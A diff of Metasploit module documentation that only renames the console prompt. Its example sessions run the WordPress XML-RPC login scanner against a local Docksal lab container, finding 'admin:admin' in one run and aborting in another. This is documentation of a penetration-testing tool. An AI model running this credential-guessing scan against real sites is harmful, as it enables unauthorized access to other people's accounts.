@@ -116,16 +116,16 @@ Try the username as the password for all users (default: `false`)
 Follow the Instructions above to setup the Docksal Containers.
 
 ```
-msf5 > use auxiliary/scanner/http/wordpress_xmlrpc_login 
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > set RHOST msf-wp.docksal
+msf > use auxiliary/scanner/http/wordpress_xmlrpc_login 
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > set RHOST msf-wp.docksal
 RHOST => msf-wp.docksal
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > set VHOST msf-wp.docksal
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > set VHOST msf-wp.docksal
 VHOST => msf-wp.docksal
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > set USERNAME admin
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > set USERNAME admin
 USERNAME => admin
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > set PASSWORD admin
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > set PASSWORD admin
 PASSWORD => admin
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > run
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > run
 
 [*] 192.168.64.100:80    :/xmlrpc.php - Sending Hello...
 [+] 192.168.64.100:80 - XMLRPC enabled, Hello message received!
@@ -133,7 +133,7 @@ msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > run
 [+] 192.168.64.100:80 - Success: 'admin:admin'
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > 
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > 
 
 ```
 
@@ -144,19 +144,19 @@ You may see this message also, if you forgot to set the `VHOST` option.
 
 
 ```
-msf5 > use auxiliary/scanner/http/wordpress_xmlrpc_login 
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > set RHOST msf-wp.docksal
+msf > use auxiliary/scanner/http/wordpress_xmlrpc_login 
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > set RHOST msf-wp.docksal
 RHOST => msf-wp.docksal
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > set USERNAME admin
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > set USERNAME admin
 USERNAME => admin
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > set PASSWORD admin
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > set PASSWORD admin
 PASSWORD => admin
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > run
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > run
 
 [*] 192.168.64.100:80    :/xmlrpc.php - Sending Hello...
 [-] XMLRPC is not enabled! Aborting
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) > 
+msf auxiliary(scanner/http/wordpress_xmlrpc_login) > 
 
 ```
